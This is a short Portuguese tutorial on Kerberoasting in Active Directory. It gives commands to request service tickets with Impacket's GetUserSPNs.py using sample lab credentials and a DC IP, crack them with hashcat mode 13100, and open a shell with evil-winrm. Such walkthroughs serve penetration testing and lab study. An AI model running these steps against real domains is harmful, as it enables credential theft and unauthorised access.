O KERBEROASTING É UM ATAQUE QUE EXPLORAR UMA FUNCIONALIDADE PADRÃO DE AUTENTICAÇÃO DO ACTIVE
DIRECTORY, CONSISTE EM VOCÊ PEDIR UM TICKET E FAZER UM BRUTE-FORCE NO TICKET, PARA 
DESCOBRIR A SENHA DO USUÁRIO, PORQUE ESSE TICKET É CRIPTOGRAFADO COM A HASH DA SENHA
PARA FAZER ESSE ATAQUE VOCÊ PRECISA DE CREDENCIAIS DE UM USUÁRIO E SABER O NOME DO DOMINIO
DO ACTIVE DIRECTORY.
	
	PARA FAZER ESSE ATAQUE KERBEROASTING SERÁ UTILIZADO UMA FERRAMENTA
	DO IMPACKET QUE É O GETUSERSPNS
	
		1.EXECUTE A FERRAMENTA
			
			COMANDO: GetUserSPNs.py
			
		2.PROCURE POR POSITIONAL ARGUMENTS E COPIE OS PARÂMETROS
		
			EX: domain[/username[:password]]
			
		3.COLE OS PARÂMETROS NA LINHA DE COMANDO E ALTERE OS PARA OS
		VALORES REAIS E ADICIONE O PARÂMETRO DC IP PARA PASSAR
		O IP DO ALVO E O REQUEST.
		
			EX:GetUserSPNs.py domain[/username[:password]] -dc-ip <ip> -request
			
			ALTERADO: GetUserSPNs.py LTlab.local/Carlos:Pass123 -dc-ip 192.145.23.34 -request
			
		4.APÓS ISSO VOCÊ RECEBERÁ UM TICKET CRIPTOGRAFADO E NELE TERÁ
		O NOME DO USUÁRIO DO SPN E VOCÊ PODE TENTAR QUEBRA-LO USANDO O HASHCAT OU JOHN.
			
			NO HASHCAT A CRIPTOGRAFIA DO KERBEROS É A 13100
			
				COMANDO: hashcat -m 13100 hashticket.txt wordlist.txt
				
		5.APÓS QUEBRAR, VOCÊ PODERÁ FAZER SHELL COM O EVIL-WINRM
		USANDO O NOME E SENHA DO USUÁRIO DO SPN.
